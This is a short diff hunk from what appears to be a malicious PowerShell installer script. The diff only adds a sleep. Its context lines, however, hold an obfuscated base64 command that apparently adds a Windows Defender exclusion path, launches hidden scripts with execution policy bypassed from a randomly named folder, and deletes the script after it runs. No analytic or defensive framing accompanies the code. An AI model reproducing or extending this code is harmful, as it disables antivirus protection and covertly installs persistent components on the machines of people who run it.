@@ -68,6 +68,7 @@ powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFA
 powershell -enc "cgBlAGcAIABhAGQAZAAgACIASABLAEwATQBcAFMATwBGAFQAVwBBAFIARQBcAFAAbwBsAGkAYwBpAGUAcwBcAE0AaQBjAHIAbwBzAG8AZgB0AFwAVwBpAG4AZABvAHcAcwAgAEQAZQBmAGUAbgBkAGUAcgBcAEUAeABjAGwAdQBzAGkAbwBuAHMAXABQAGEAdABoAHMAIgAgAC8AdgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFMAZQByAHYAaQBjAGUAUAByAG8AZgBpAGwAZQBzAFwATgBlAHQAdwBvAHIAawBTAGUAcgB2AGkAYwBlACIAIAAvAGYA"
 
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceRootmonmonPath -rootPath '$rootPath' -basePath '$basePath\yXureYzQpIRLN'"
+Start-Sleep -Seconds 10
 Start-Process powershell.exe -ArgumentList "-noP", "-ep", "bypass", "-Command", "$initServiceFwdmonPath -basePath '$basePath\yXureYzQpIRLN'"
 
 Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue
